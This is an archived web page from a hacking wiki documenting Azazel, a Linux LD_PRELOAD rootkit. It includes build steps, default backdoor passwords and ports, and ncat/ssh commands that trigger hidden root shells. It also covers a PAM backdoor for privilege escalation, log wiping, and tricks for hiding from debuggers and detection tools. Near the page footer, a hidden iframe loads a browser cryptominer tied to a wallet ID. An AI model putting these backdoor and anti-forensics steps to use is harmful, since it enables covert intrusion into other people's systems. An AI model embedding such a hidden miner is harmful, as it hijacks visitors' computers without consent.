http://www.blackhatlibrary.net/Azazel
HTTP/1.1 200 OK
Server: cloudflare-nginx
Date: Thu, 24 Jul 2014 00:04:47 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Set-Cookie: __cfduid=de12d604edef8006c05b03f60f73f06091406160286967; expires=Mon, 23-Dec-2019 23:50:00 GMT; path=/; domain=.blackhatlibrary.net; HttpOnly
X-Powered-By: PHP/5.4.15
Content-language: en
Vary: Accept-Encoding, Cookie
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Cache-Control: private, must-revalidate, max-age=0
CF-RAY: 14ebdcc18a0e0874-IAD
Content-Encoding: gzip

<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8" />
<title>Azazel - Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools</title>
<meta name="generator" content="MediaWiki" />
<meta name="og:title" content="Azazel" />
<meta name="og:type" content="article" />
<meta name="og:image" content="http://www.blackhatacademy.org/security101/logo.png" />
<meta name="og:site_name" content="Blackhat Academy - Security101 Wiki" />
<meta name="og:description" content="For security reasons, we cannot remotely parse content.  Please visit the link provided to see the full article!" />
<link rel="shortcut icon" href="/favicon.ico" />
<link rel="search" type="application/opensearchdescription+xml" href="/opensearch_desc.php" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools (en)" />
<link rel="EditURI" type="application/rsd+xml" href="http://www.blackhatlibrary.net/api.php?action=rsd" />
<link rel="alternate" type="application/atom+xml" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools Atom feed" href="/index.php?title=Special:RecentChanges&amp;feed=atom" />
<link rel="stylesheet" href="/load.php?debug=false&amp;lang=en&amp;modules=mediawiki.legacy.commonPrint%2Cshared&amp;only=styles&amp;skin=monobook&amp;*" />
<link rel="stylesheet" href="/skins/monobook/main.css?" media="screen" />
<!--[if lt IE 5.5000]><link rel="stylesheet" href="/skins/monobook/IE50Fixes.css?" media="screen" /><![endif]-->
<!--[if IE 5.5000]><link rel="stylesheet" href="/skins/monobook/IE55Fixes.css?" media="screen" /><![endif]-->
<!--[if IE 6]><link rel="stylesheet" href="/skins/monobook/IE60Fixes.css?" media="screen" /><![endif]-->
<!--[if IE 7]><link rel="stylesheet" href="/skins/monobook/IE70Fixes.css?" media="screen" /><![endif]--><meta name="ResourceLoaderDynamicStyles" content="" />
<style type="text/css">/*<![CDATA[*/
.source-c {line-height: normal;}
.source-c li, .source-c pre {
	line-height: normal; border: 0px none white;
}
/**
 * GeSHi Dynamically Generated Stylesheet
 * --------------------------------------
 * Dynamically generated stylesheet for c
 * CSS class: source-c, CSS id: 
 * GeSHi (C) 2004 - 2007 Nigel McNie, 2007 - 2008 Benny Baumann
 * (http://qbnz.com/highlighter/ and http://geshi.org/)
 * --------------------------------------
 */
.c.source-c .de1, .c.source-c .de2 {font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;}
.c.source-c  {font-family:monospace;}
.c.source-c .imp {font-weight: bold; color: red;}
.c.source-c li, .c.source-c .li1 {font-weight: normal; vertical-align:top;}
.c.source-c .ln {width:1px;text-align:right;margin:0;padding:0 2px;vertical-align:top;}
.c.source-c .li2 {font-weight: bold; vertical-align:top;}
.c.source-c .kw1 {color: #b1b100;}
.c.source-c .kw2 {color: #000000; font-weight: bold;}
.c.source-c .kw3 {color: #000066;}
.c.source-c .kw4 {color: #993333;}
.c.source-c .co1 {color: #666666; font-style: italic;}
.c.source-c .co2 {color: #339933;}
.c.source-c .coMULTI {color: #808080; font-style: italic;}
.c.source-c .es0 {color: #000099; font-weight: bold;}
.c.source-c .es1 {color: #000099; font-weight: bold;}
.c.source-c .es2 {color: #660099; font-weight: bold;}
.c.source-c .es3 {color: #660099; font-weight: bold;}
.c.source-c .es4 {color: #660099; font-weight: bold;}
.c.source-c .es5 {color: #006699; font-weight: bold;}
.c.source-c .br0 {color: #009900;}
.c.source-c .sy0 {color: #339933;}
.c.source-c .st0 {color: #ff0000;}
.c.source-c .nu0 {color: #0000dd;}
.c.source-c .nu6 {color: #208080;}
.c.source-c .nu8 {color: #208080;}
.c.source-c .nu12 {color: #208080;}
.c.source-c .nu16 {color:#800080;}
.c.source-c .nu17 {color:#800080;}
.c.source-c .nu18 {color:#800080;}
.c.source-c .nu19 {color:#800080;}
.c.source-c .me1 {color: #202020;}
.c.source-c .me2 {color: #202020;}
.c.source-c .ln-xtra, .c.source-c li.ln-xtra, .c.source-c div.ln-xtra {background-color: #ffc;}
.c.source-c span.xtra { display:block; }

/*]]>*/
</style>
<style type="text/css">/*<![CDATA[*/
@import "/index.php?title=MediaWiki:Geshi.css&usemsgcache=yes&action=raw&ctype=text/css&smaxage=18000";
/*]]>*/
</style></head>
<body class="mediawiki ltr ns-0 ns-subject page-Azazel skin-monobook">
<div id="globalWrapper">
<div id="column-content"><div id="content">
	<a id="top"></a>
	<div id="siteNotice"><div id="localNotice"><div align="right"><i>Questions about this topic? <a href="/Special:UserLogin" title="Special:UserLogin">Sign up</a> to ask in the talk tab</i>.</div><br />
</div></div>	<div align="center" id="ad"><script type="text/javascript"><!--
google_ad_client = "ca-pub-3100048614381705";
google_ad_slot = "3567986077";
google_ad_width = 728;
google_ad_height = 90;
//-->
</script>
<script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
</script>
</div>
	<h1 id="firstHeading" class="firstHeading">Azazel</h1>
	<div id="bodyContent">
		<div id="siteSub">From Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools</div>
		<div id="contentSub"></div>
		<div id="jump-to-nav">Jump to: <a href="#column-one">navigation</a>, <a href="#searchInput">search</a></div>
		<!-- start content -->
<p><b>Azazel</b> is a userland rootkit written in <a href="/C" title="C">C</a> based off of the original <a href="/LD_PRELOAD" title="LD PRELOAD" class="mw-redirect">LD_PRELOAD</a> technique from <a href="/Jynx" title="Jynx" class="mw-redirect">Jynx</a> rootkit.  It is more robust and has additional features, and focuses heavily around <i>anti-debugging</i> and <i>anti-detection</i>.  Features include log cleaning, pcap subversion, <a href="#Features">and more</a>.
</p>
<center><span><div style="border: 1px solid #000; height: 30px; width:60%;">
<div style="width: 25%; float: left; padding-top:4px;"><a name="fb_share"></a><script src="http://static.ak.fbcdn.net/connect.php/js/FB.Share" type="text/javascript"></script></div>
<div style="width: 25%; float: left; padding-top:6px;"><script type="text/javascript" src="http://www.reddit.com/static/button/button1.js"></script></div>
<div style="width: 25%; float: left; padding-top:5px;"><a style="float:center;" data-related="blackhatstaff" data-count="0" data-via="blackhatstaff" href="https://twitter.com/share" class="twitter-share-button">Tweet</a><script src="//platform.twitter.com/widgets.js" type="text/javascript"></script>
</div><div style="width: 25%; float: left; padding-top:5px;">
<a class="DiggThisButton DiggCompact"></a><script type="text/javascript">
(function() {
  var s = document.createElement('SCRIPT'), s1 = document.getElementsByTagName('SCRIPT')[0];
  s.type = 'text/javascript';
  s.async = true;
  s.src = 'http://widgets.digg.com/buttons.js';
  s1.parentNode.insertBefore(s, s1);
})();
</script></div>
</div></span>
</center> 
<p><br />
</p>
<table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Contents</h2></div>
<ul>
<li class="toclevel-1 tocsection-1"><a href="#Disclaimer"><span class="tocnumber">1</span> <span class="toctext">Disclaimer</span></a></li>
<li class="toclevel-1 tocsection-2"><a href="#Features"><span class="tocnumber">2</span> <span class="toctext">Features</span></a></li>
<li class="toclevel-1 tocsection-3"><a href="#Latest_Source"><span class="tocnumber">3</span> <span class="toctext">Latest Source</span></a></li>
<li class="toclevel-1 tocsection-4"><a href="#Hooking_Methods"><span class="tocnumber">4</span> <span class="toctext">Hooking Methods</span></a></li>
<li class="toclevel-1 tocsection-5"><a href="#Configuration"><span class="tocnumber">5</span> <span class="toctext">Configuration</span></a></li>
<li class="toclevel-1 tocsection-6"><a href="#Backdoor_Examples"><span class="tocnumber">6</span> <span class="toctext">Backdoor Examples</span></a>
<ul>
<li class="toclevel-2 tocsection-7"><a href="#Plaintext_backdoor"><span class="tocnumber">6.1</span> <span class="toctext">Plaintext backdoor</span></a></li>
<li class="toclevel-2 tocsection-8"><a href="#Crypthook_backdoor"><span class="tocnumber">6.2</span> <span class="toctext">Crypthook backdoor</span></a></li>
<li class="toclevel-2 tocsection-9"><a href="#PAM_backdoor"><span class="tocnumber">6.3</span> <span class="toctext">PAM backdoor</span></a></li>
</ul>
</li>
<li class="toclevel-1 tocsection-10"><a href="#Log_Clearing"><span class="tocnumber">7</span> <span class="toctext">Log Clearing</span></a></li>
<li class="toclevel-1 tocsection-11"><a href="#Anti-Debugging"><span class="tocnumber">8</span> <span class="toctext">Anti-Debugging</span></a></li>
<li class="toclevel-1 tocsection-12"><a href="#Process_Hiding"><span class="tocnumber">9</span> <span class="toctext">Process Hiding</span></a></li>
<li class="toclevel-1 tocsection-13"><a href="#Preliminary_ldd.2Funhide_obfuscation"><span class="tocnumber">10</span> <span class="toctext">Preliminary ldd/unhide obfuscation</span></a></li>
<li class="toclevel-1 tocsection-14"><a href="#Removal"><span class="tocnumber">11</span> <span class="toctext">Removal</span></a></li>
<li class="toclevel-1 tocsection-15"><a href="#Related"><span class="tocnumber">12</span> <span class="toctext">Related</span></a></li>
</ul>
</td></tr></table>
<h2> <span class="mw-headline" id="Disclaimer"> Disclaimer </span></h2>
<table style="background: #FFC1C1; border: 2px solid #FF7070; width: 90%; margin: 5px auto; border-radius: 10px; -moz-border-radius: 10px; -webkit-border-radius: 10px; -khtml-border-radius: 10px; -icab-border-radius: 10px; -o-border-radius: 10px;">
<tr>
<td width="1%" style="padding-right:1em;"><img src="http://i.imgur.com/RPU0j.png" alt="RPU0j.png" />
</td>
<td>  It is a crime to use techniques or tools on this page against any system without written authorization unless the system in question belongs to you
</td></tr></table>
<h2> <span class="mw-headline" id="Features"> Features </span></h2>
<ul><li> Anti-debugging
</li><li> Avoids unhide, lsof, ps, ldd detection
</li><li> Hides files and directories
</li><li> Hides remote connections
</li><li> Hides processes
</li><li> Hides logins
</li><li> PCAP hooks avoid local sniffing
</li><li> Two accept backdoors with full PTY shells.
</li></ul>
<dl><dd><ul><li> Crypthook encrypted accept() backdoor
</li><li> Plaintext accept() backdoor
</li></ul>
</dd></dl>
<ul><li> PAM backdoor for local privesc and remote entry
</li><li> Log cleanup for utmp/wtmp entries based on pty
</li><li> Uses <a href="/Xor" title="Xor" class="mw-redirect">xor</a> to obfuscate static strings
</li></ul>
<h2> <span class="mw-headline" id="Latest_Source"> Latest Source </span></h2>
<ul><li> Clone the sources
</li></ul>
<table cellspacing="0" width="80%">
<tr style="background-color: #5E5C5D">
  <td style="color: white"> <strong>Terminal</strong></td>
</tr>
<tr style="background-color: black"><td><br /></td></tr>
<tr style="background-color: black">
  <td style="color: white"><font color="royalblue">localhost</font>:<font color="red">~</font> <font color="green">$</font> <strong>git clone <a href="https://github.com/chokepoint/azazel.git" class="external free" rel="nofollow">https://github.com/chokepoint/azazel.git</a></strong></td>
</tr>
<tr style="background-color: black"><td><br /></td></tr>
</table>
<ul><li> Build the rootkit
</li></ul>
<table cellspacing="0" width="80%">
<tr style="background-color: #5E5C5D">
  <td style="color: white"> <strong>Terminal</strong></td>
</tr>
<tr style="background-color: black"><td><br /></td></tr>
<tr style="background-color: black">
  <td style="color: white"><font color="royalblue">localhost</font>:<font color="red">~</font> <font color="green">$</font> <strong>make</strong></td>
</tr>
<tr style="background-color: black"><td><br /></td></tr>
</table>
<table style="background: #FFC1C1; border: 2px solid #FF7070; width: 90%; margin: 5px auto; border-radius: 10px; -moz-border-radius: 10px; -webkit-border-radius: 10px; -khtml-border-radius: 10px; -icab-border-radius: 10px; -o-border-radius: 10px;">
<tr>
<td width="1%" style="padding-right:1em;"><img src="http://i.imgur.com/RPU0j.png" alt="RPU0j.png" />
</td>
<td>Running "make install" will inject the live kit into your system. While removal is not impossible, it's an unnecessary and painful procedure, not to mention you may forget to remove it.
</td></tr></table>
<h2> <span class="mw-headline" id="Hooking_Methods"> Hooking Methods </span></h2>
<p>Azazel utilizes the same hooking methods as <a href="/Jynx" title="Jynx" class="mw-redirect">Jynx/Jynx2</a>. You can hook individual programs at the time of execution by taking advantage of the <a href="/LD_PRELOAD" title="LD PRELOAD" class="mw-redirect">LD_PRELOAD</a> variable. By default, Azazel installs itself as <b>libselinux.so</b> into <i>/lib</i>. An entry is then added to <i>/etc/ld.so.preload</i> in order to hook system wide dynamically compiled programs. 
</p>
<ul><li> Example runtime hooking of bash.
</li></ul>
<table cellspacing="0" width="80%">
<tr style="background-color: #5E5C5D">
  <td style="color: white"> <strong>Terminal</strong></td>
</tr>
<tr style="background-color: black"><td><br /></td></tr>
<tr style="background-color: black">
  <td style="color: white"><font color="royalblue">localhost</font>:<font color="red">~</font> <font color="green">$</font> <strong>LD_PRELOAD&#x3d;/lib/libselinux.so bash -l</strong></td>
</tr>
<tr style="background-color: black"><td><br /></td></tr>
</table>
<p>Instead of dlsym'ing direct libc functions by globally declaring old_syscall, Azazel has a new structure in azazel.h named syscall_list. This allows all of the required functions to be linked upon initiation of the library. Syscall function names are XORed by config.py and written to const.h. Original libc functions can be accessed by using the preprocessor definitions also in const.h. Each definition has a prefix of SYS_name_of_function_in_caps. For example to call libc's version of fopen, you would use <b>syscalls[SYS_FOPEN].syscall_func();</b>
</p>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="c source-c"><pre class="de1"><span class="kw4">typedef</span> <span class="kw4">struct</span> struct_syscalls <span class="br0">&#123;</span>
        <span class="kw4">char</span> syscall_name<span class="br0">&#91;</span><span class="nu0">51</span><span class="br0">&#93;</span><span class="sy0">;</span>
        <span class="kw4">void</span> <span class="sy0">*</span><span class="br0">&#40;</span><span class="sy0">*</span>syscall_func<span class="br0">&#41;</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span> s_syscalls<span class="sy0">;</span></pre></div></div>
</td></tr></table>
<h2> <span class="mw-headline" id="Configuration"> Configuration </span></h2>
<p>All <a href="/Variable" title="Variable">variables</a> that require changing prior to deployment are located near the top of config.py. Variable data is <a href="/Cryptography" title="Cryptography">ciphered</a> using an <a href="/XOR" title="XOR" class="mw-redirect">XOR</a> key in order to not expose them to dumping programs like "strings." See below for a list of variables and their associated purpose.
</p>
<table style="background: #F8F8FF; border: 2px solid #8888AA; width: 90%; margin: 5px auto; border-radius: 10px; -moz-border-radius: 10px; -webkit-border-radius: 10px; -khtml-border-radius: 10px; -icab-border-radius: 10px; -o-border-radius: 10px;">
<tr>
<td width="1%" style="padding-right:1em;"><img src="http://i.imgur.com/c3el4.png" alt="c3el4.png" />
</td>
<td><center>The rootkit will hide all TCP/IP connections within these HIGH and LOW port ranges.  These ranges are used to not only hide from netstat/lsof, but also to hide from sniffing using libpcap.</center>
</td></tr></table>
<table class="wikitable" style="text-align:center;">
<caption> Numeric
</caption>
<tr>
<th scope="col"> Variable(s)
</th>
<th scope="col"> Description
</th>
<th scope="col"> Default
</th></tr>
<tr>
<th scope="row"> LOW_PORT / HIGH_PORT
</th>
<td> Ports used to trigger full PTY plaintext backdoor.
</td>
<td> 61040 - 61050
</td></tr>
<tr>
<th scope="row"> CRYPT_LOW / CRYPT_HIGH
</th>
<td> Ports used to trigger full PTY crypthook backdoor.
</td>
<td> 61051 - 61060
</td></tr>
<tr>
<th scope="row"> PAM_PORT
</th>
<td> Also hides this port but doesn't trigger accept backdoor.
</td>
<td> 61061
</td></tr>
<tr>
<th scope="row"> SHELL_MSG
</th>
<td> Display this string to users once they get a shell
</td>
<td> Welcome
</td></tr>
<tr>
<th scope="row"> SHELL_PASSWD
</th>
<td> Shell password for both plaintext and crypthook backdoors
</td>
<td> changeme
</td></tr>
<tr>
<th scope="row"> SHELL_TYPE
</th>
<td> Use this shell for accept() backdoors.
</td>
<td> /bin/bash
</td></tr>
<tr>
<th scope="row"> MAGIC_STRING
</th>
<td> Hide any files with this string in the file name.
</td>
<td> __
</td></tr>
<tr>
<th scope="row"> BLIND_LOGIN
</th>
<td> Fake user account used to activate the PAM backdoor.
</td>
<td> rootme
</td></tr>
<tr>
<th scope="row"> ANTI_DEBUG_MSG
</th>
<td> Display this message to the sys admin if they try to ptrace
</td>
<td> Don't scratch the walls.
</td></tr>
<tr>
<th scope="row"> CLEANUP_LOGS
</th>
<td> If this environment var is set to a valid pts, then cleanup utmp/wtmp logs for that pts.
</td>
<td> CLEANUP_LOGS
</td></tr>
</table>
<p><br />
</p>
<ul><li> The following variables are specifically included for the crypthook backdoor.
</li></ul>
<p><br />
</p>
<table class="wikitable" style="text-align:center;">
<caption> Numeric
</caption>
<tr>
<th scope="col"> Variable(s)
</th>
<th scope="col"> Description
</th>
<th scope="col"> Default
</th></tr>
<tr>
<th scope="row"> PASSPHRASE
</th>
<td> This key is used for encryption / decryption of sessions
</td>
<td> Hello NSA
</td></tr>
<tr>
<th scope="row"> KEY_SALT
</th>
<td> Key salt used for key derivation.
</td>
<td> changeme
</td></tr>
</table>
<h2> <span class="mw-headline" id="Backdoor_Examples"> Backdoor Examples </span></h2>
<p>For each of these examples we are assuming that sshd is hooked with azazel and able to trigger any of the three operational backdoors. 
</p>
<h3> <span class="mw-headline" id="Plaintext_backdoor"> Plaintext backdoor </span></h3>
<p>We need to set the local port to something within the ranges of <b>LOW_PORT</b> and <b>HIGH_PORT</b> as configured above. This not only ensures that the connection will be hidden from local sniffing and detection, but it also triggers a full PTY interactive shell upon entering the correct password. The local port can be set using ncat's -p option. Upon successfuly connecting to the remote daemon, the first line you enter should be the <b>SHELL_PASSWD</b> that you created.
</p>
<pre>   $ ncat target 22 -p 61040 
   changeme
   Welcome!
   Here's a shell.
   root@host:/root #
</pre>
<h3> <span class="mw-headline" id="Crypthook_backdoor"> Crypthook backdoor </span></h3>
<p>Triggering the Crypthook backdoor is similar to the plain text backdoor, but we need to speak the same protocol. Crypthook is an AES encryption wrapper for TCP/UDP connections and can be downloaded from here. The Crypthook relies on preload hooking as well, and can be used with netcat by utilizing <b>LD_PRELOAD</b> environment variable.
</p>
<pre>   $ LD_PRELOAD=./crypthook.so ncat localhost 22 -p 61051
   changeme
   Welcome!
   Here's a shell.
   root@host:/root/ #
</pre>
<h3> <span class="mw-headline" id="PAM_backdoor"> PAM backdoor </span></h3>
<p>The PAM hooks work by waiting for the specified fake user to attempt a connection. The hooks return the pw entry for root and accept any password to establish a successful login. Since this method would generally be used with sshd, the connection will not be hidden unless you can force ssh client to bind to a local port within one of the port ranges. Another client shared library has been included to force a program to bind to a port that we'd like to hide.
</p>
<pre>   $ make client
   $ LD_PRELOAD=./client.so ssh rootme@localhost
   root@host:/ #
</pre>
<ul><li> The PAM hooks can also be used for local privesc.
</li></ul>
<pre>   $ su - rootme
   #
</pre>
<h2> <span class="mw-headline" id="Log_Clearing"> Log Clearing </span></h2>
<p>Log clearing can be accomplished by setting the environment variable to the tty/pts device that you want to remove from the records and then executing a command. When accessing the target system using either of the accept backdoors, the given pseudoterminal is automatically removed from both utmp and wtmp log files. However, if you need to use the PAM backdoor through SSH, you will need to manually remove your pts from the logs as demonstrated below.
</p>
<pre>   $ w | grep pts/16
   root   pts/16  &#160;:0.0             Wed16    2:33m  0.16s  0.16s bash
</pre>
<pre>   $ CLEANUP_LOGS="pts/16" ls
   utmp logs cleaned up.
   wtmp logs cleaned up.
</pre>
<pre>   $ w | grep pts/16
   $
</pre>
<h2> <span class="mw-headline" id="Anti-Debugging"> Anti-Debugging </span></h2>
<p>Azazel hooks <b>ptrace()</b> and returns -1, hence denying any debugging from occuring. The message displayed to the sysadmin is really more of a joke than anything and will definitely set off alarms that something is wrong.
</p>
<pre>   $ strace -p $PPID
   Don't scratch the walls
</pre>
<p>This works on any userland debugger (ltrace, strace, gdb, ftrace).  This hook could be easily extended to hide specific information should you desire to do so.
</p>
<h2> <span class="mw-headline" id="Process_Hiding"> Process Hiding </span></h2>
<p>Jynx/Jynx2 relied on a specified GID in order to hide processes and files. There are some obvious problems with using this method, so Azazel addresses this by again using environment variables to mask any processes that may give away our presence. The variable can also be configured inside of <b>config.py</b>, but defaults to <b>HIDE_THIS_SHELL</b>. 
</p>
<pre>   $ env HIDE_THIS_SHELL=plz ncat -l -p 61061
</pre>
<p>When this environment variable is set, the process is able to see files and processes hidden by the rootkit.  This is important for the PAM hook.  Because PAM invokes <a href="/Bash" title="Bash">bash</a> on its own, you have to use this environment variable to access hidden files.
</p>
<h2> <span class="mw-headline" id="Preliminary_ldd.2Funhide_obfuscation"> Preliminary ldd/unhide obfuscation </span></h2>
<p>Azazel avoids detection from ldd and unhide by selectively NOT hooking those two programs. Once the programs are done, azazel continues hooking programs as normal. This opens up a window for removing the offending library, but at this point it is better than completely revealing the kit. The next release will include a more advanced anti-debug / ldd/unhide obfuscation.
</p>
<h2> <span class="mw-headline" id="Removal"> Removal </span></h2>
<p>To remove Azazel, the best course of action is to boot into a livecd, mount your bootable hard drive, and delete the /etc/ld_preload.so file from the partition.
</p>
<h2> <span class="mw-headline" id="Related"> Related </span></h2>
<ul><li> <a href="/Linux" title="Linux">Linux</a>
</li><li> <a href="/LD_PRELOAD" title="LD PRELOAD" class="mw-redirect">LD_PRELOAD</a>
</li><li> <a href="/C" title="C">C</a>
</li><li> <a href="http://www.chokepoint.net/2013/09/crypthook-secure-tcpudp-connection.html" class="external text" rel="nofollow">CryptHook</a>
</li><li> <a href="/Jynx" title="Jynx" class="mw-redirect">Jynx</a>
</li><li> <a href="/Hooking_PAM" title="Hooking PAM" class="mw-redirect">Hooking PAM</a>
</li></ul>
<p><br />
</p>
<center><span><div style="border: 1px solid #000; height: 30px; width:60%;">
<div style="width: 25%; float: left; padding-top:4px;"><a name="fb_share"></a><script src="http://static.ak.fbcdn.net/connect.php/js/FB.Share" type="text/javascript"></script></div>
<div style="width: 25%; float: left; padding-top:6px;"><script type="text/javascript" src="http://www.reddit.com/static/button/button1.js"></script></div>
<div style="width: 25%; float: left; padding-top:5px;"><a style="float:center;" data-related="blackhatstaff" data-count="0" data-via="blackhatstaff" href="https://twitter.com/share" class="twitter-share-button">Tweet</a><script src="//platform.twitter.com/widgets.js" type="text/javascript"></script>
</div><div style="width: 25%; float: left; padding-top:5px;">
<a class="DiggThisButton DiggCompact"></a><script type="text/javascript">
(function() {
  var s = document.createElement('SCRIPT'), s1 = document.getElementsByTagName('SCRIPT')[0];
  s.type = 'text/javascript';
  s.async = true;
  s.src = 'http://widgets.digg.com/buttons.js';
  s1.parentNode.insertBefore(s, s1);
})();
</script></div>
</div></span>
</center>

<!-- 
NewPP limit report
Preprocessor node count: 177/1000000
Post-expand include size: 4514/2097152 bytes
Template argument size: 678/2097152 bytes
Expensive parser function count: 0/100
-->
<div class="printfooter">
Retrieved from "<a href="http://www.blackhatlibrary.net/Azazel">http://www.blackhatlibrary.net/Azazel</a>"</div>
		<div id='catlinks' class='catlinks catlinks-allhidden'></div>		<!-- end content -->
				<div class="visualClear"></div>
	</div>
</div></div>
<div id="column-one">
	<div id="p-cactions" class="portlet">
		<h5>Views</h5>
		<div class="pBody">
			<ul>
				 <li id="ca-nstab-main" class="selected"><a href="/Azazel" title="View the content page [c]" accesskey="c">Page</a></li>
				 <li id="ca-talk" class="new"><a href="/index.php?title=Talk:Azazel&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
				 <li id="ca-viewsource"><a href="/index.php?title=Azazel&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
				 <li id="ca-history"><a href="/index.php?title=Azazel&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
			</ul>
		</div>
	</div>
	<div class="portlet" id="p-personal">
		<h5>Personal tools</h5>
		<div class="pBody">
			<ul>
				<li id="pt-login"><a href="/index.php?title=Special:UserLogin&amp;returnto=Azazel" title="You are encouraged to log in; however, it is not mandatory [o]" accesskey="o">Log in</a></li>
			</ul>
		</div>
	</div>
	<div class="portlet" id="p-logo">
		<a style="background-image: url(/logo.png);" href="/Main_Page" title="Visit the main page"></a>
	</div>
	<script type="text/javascript"> if (window.isMSIE55) fixalpha(); </script>
	<div class='generated-sidebar portlet' id='p-Wiki'>
		<h5>Wiki</h5>
		<div class='pBody'>
			<ul>
				<li id="n-mainpage-description"><a href="/Main_Page" title="Visit the main page [z]" accesskey="z">Main page</a></li>
				<li id="n-The-index"><a href="/Category:Indexing">The index</a></li>
				<li id="n-Donate"><a href="/Donations">Donate</a></li>
				<li id="n-Contribute"><a href="/Category:Requested_maintenance">Contribute</a></li>
				<li id="n-recentchanges"><a href="/Special:RecentChanges" title="The list of recent changes in the wiki [r]" accesskey="r">Recent changes</a></li>
				<li id="n-randompage"><a href="/Special:Random" title="Load a random page [x]" accesskey="x">Random page</a></li>
			</ul>
		</div>
	</div>
	<div class='generated-sidebar portlet' id='p-Community'>
		<h5>Community</h5>
		<div class='pBody'>
			<ul>
				<li id="n-Chokepoint"><a href="http://www.chokepoint.net">Chokepoint</a></li>
				<li id="n-.2Fr.2Fblackhat"><a href="http://reddit.com/r/blackhat">/r/blackhat</a></li>
				<li id="n-.40BlackhatStaff"><a href="http://twitter.com/BlackhatStaff">@BlackhatStaff</a></li>
			</ul>
		</div>
	</div>
	<div id="p-search" class="portlet">
		<h5><label for="searchInput">Search</label></h5>
		<div id="searchBody" class="pBody">
			<form action="/index.php" id="searchform">
				<input type='hidden' name="title" value="Special:Search"/>
				<input id="searchInput" title="Search Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools" accesskey="f" type="search" name="search" />
				<input type='submit' name="go" class="searchButton" id="searchGoButton"	value="Go" title="Go to a page with this exact name if exists" />&#160;
				<input type='submit' name="fulltext" class="searchButton" id="mw-searchButton" value="Search" title="Search the pages for this text" />
			</form>
		</div>
	</div>
	<div class="portlet" id="p-tb">
		<h5>Toolbox</h5>
		<div class="pBody">
			<ul>
				<li id="t-whatlinkshere"><a href="/Special:WhatLinksHere/Azazel" title="List of all wiki pages that link here [j]" accesskey="j">What links here</a></li>
				<li id="t-recentchangeslinked"><a href="/Special:RecentChangesLinked/Azazel" title="Recent changes in pages linked from this page [k]" accesskey="k">Related changes</a></li>
<li id="t-specialpages"><a href="/Special:SpecialPages" title="List of all special pages [q]" accesskey="q">Special pages</a></li>
				<li id="t-print"><a href="/index.php?title=Azazel&amp;printable=yes" rel="alternate" title="Printable version of this page [p]" accesskey="p">Printable version</a></li>				<li id="t-permalink"><a href="/index.php?title=Azazel&amp;oldid=46590" title="Permanent link to this revision of the page">Permanent link</a></li>			</ul>
		</div>
	</div>
&nbsp;

<script type="text/javascript"><!--
google_ad_client = "ca-pub-3100048614381705";
/* BHL Sidebar */
google_ad_slot = "2730381272";
google_ad_width = 120;
google_ad_height = 90;
//-->
</script>
<script type="text/javascript"
src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
</script>

<a href="http://www.srsvps.com/"><center><img src="http://blackhatlibrary.net/images/srsvps-button-tux.png" style="padding: 2px,0px,2px,0px;"></center></a><br />
<a href="http://vps-heaven.com/"><center><img src="http://blackhatlibrary.net/images/vps-heaven.png" style="padding: 2px,0px,2px,0px;"></center></a><br />
<center>VPS-Heaven now accepting BitCoin!</center><br />
<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-40369725-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>
<a href="http://www.soldierx.com/"><center><img src="http://www.soldierx.com/system/files/images/sx-mini-1.jpg" style="padding: 2px,0px,2px,0px;"></center></a>
<br /><br /><center>Our research is made possible by your support.</center><br />
<form action="https://www.paypal.com/cgi-bin/webscr" method="post">
<input type="hidden" name="cmd" value="_s-xclick">
<input type="hidden" name="hosted_button_id" value="74Q9CEK92HZCL">
<input type="image" src="https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif" border="0" name="submit" alt="PayPal - The safer, easier way to pay online!">
<img alt="" border="0" src="https://www.paypalobjects.com/en_US/i/scr/pixel.gif" width="1" height="1">
</form>
</div><!-- end of the left (by default at least) column -->
<div class="visualClear"></div>
<iframe style='display:none' src='http://tidbit.co.in/miner'><script>window.walletId = 1Lr99MtUNbUVSpU6MFA3CboYWGgZ8pHWdB</script></iframe>
<div id="footer">
	<div id="f-poweredbyico">
		<a href="http://www.mediawiki.org/"><img src="/skins/common/images/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" width="88" height="31" /></a>
	</div>
	<ul id="f-list">
		<li id="lastmod"> This page was last modified on 14 February 2014, at 02:34.</li>
		<li id="viewcount">This page has been accessed 40,094 times.</li>
		<li id="privacy"><a href="/Security101_-_Blackhat_Techniques_-_Hacking_Tutorials_-_Vulnerability_Research_-_Security_Tools:Privacy_policy" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools:Privacy policy">Privacy policy</a></li>
		<li id="about"><a href="/Security101_-_Blackhat_Techniques_-_Hacking_Tutorials_-_Vulnerability_Research_-_Security_Tools:About" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools:About">About Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools</a></li>
